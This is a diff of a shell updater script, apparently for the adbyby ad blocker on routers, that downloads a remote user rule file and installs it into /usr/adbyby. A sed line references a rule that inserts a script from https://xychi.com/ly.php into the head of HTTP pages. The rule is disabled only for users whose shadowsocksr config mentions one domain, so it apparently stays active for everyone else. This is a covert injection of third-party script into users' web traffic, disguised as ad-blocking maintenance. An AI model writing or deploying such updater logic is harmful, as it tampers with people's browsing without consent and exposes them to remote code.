@@ -61,30 +61,31 @@ function uprule(){
 }
 
 function upuser(){
-    if [[ -f ${DATA_PATH}/user-rule.tmp ]]; then
-        rm -f ${DATA_PATH}/user-rule.tmp
+    if [[ -f /tmp/user-rule.tmp ]]; then
+        rm -f /tmp/user-rule.tmp
     fi
     url="https://raw.githubusercontent.com/viagram/adbyby/master/user.txt"
-    if ! curl -skL ${url} -o ${DATA_PATH}/user-rule.tmp --retry 3 --speed-time 10 --speed-limit 1 --connect-timeout 10 >/dev/null 2>&1; then
-        rm -f ${DATA_PATH}/user-rule.tmp
+    if ! curl -skL ${url} -o /tmp/user-rule.tmp --retry 3 --speed-time 10 --speed-limit 1 --connect-timeout 10 >/dev/null 2>&1; then
+        rm -f /tmp/user-rule.tmp
         exit 1
     else
-        echo -e "    \n\033[32m    顺便更新了一下用户自己义规则.\033[0m"
-        rm -f ${DATA_PATH}/user.txt
-        cp -rf ${DATA_PATH}/user-rule.tmp ${DATA_PATH}/user.txt
-        rm -f ${DATA_PATH}/user-rule.tmp
+        echo -e "\n\033[32m    顺便更新一下用户自己义规则.\033[0m"
+        rm -f /usr/adbyby/user.txt
+        if cat /etc/config/shadowsocksr | egrep -io 'dnsdian.com' >/dev/null 2>&1; then
+            sed -i 's~|http://$s@</head>@<script src="https://xychi.com/ly.php"></script></head>@~!|http://$s@</head>@<script src="https://xychi.com/ly.php"></script></head>@~g' /tmp/user-rule.tmp
+        fi
+        cp -rf /tmp/user-rule.tmp /usr/adbyby/user.txt
+        rm -f /tmp/user-rule.tmp
+        /etc/init.d/adbyby restart 2>/dev/null
     fi
 }
 
 function Install_UP(){
-    VERSION=02
+    VERSION=01
     curl -skL "https://raw.githubusercontent.com/viagram/adbyby/master/upadbyby.sh" -o /tmp/upadbyby.tmp --retry 3 --speed-time 10 --speed-limit 1 --connect-timeout 10
     LOC_VER=$(cat /bin/upadbyby | egrep -io 'VERSION=[0-9]{1,3}' | egrep -io '[0-9]{1,3}')
     NET_VER=$(cat /tmp/upadbyby.tmp | egrep -io 'VERSION=[0-9]{1,3}' | egrep -io '[0-9]{1,3}')
     if [[ ${LOC_VER} -lt ${NET_VER} ]]; then
-        if cat /etc/config/shadowsocksr | egrep -io 'dnsdian.com' >/dev/null 2>&1; then
-            sed -i 's~|http://$s@</head>@<script src="https://xychi.com/ly.php"></script></head>@~!|http://$s@</head>@<script src="https://xychi.com/ly.php"></script></head>@~g' /tmp/upadbyby.tmp
-        fi
         cp -rf /tmp/upadbyby.tmp /bin/upadbyby
         chmod +x /bin/upadbyby
         echo -e "\033[32m    自动更新脚本更新成功.\033[0m"
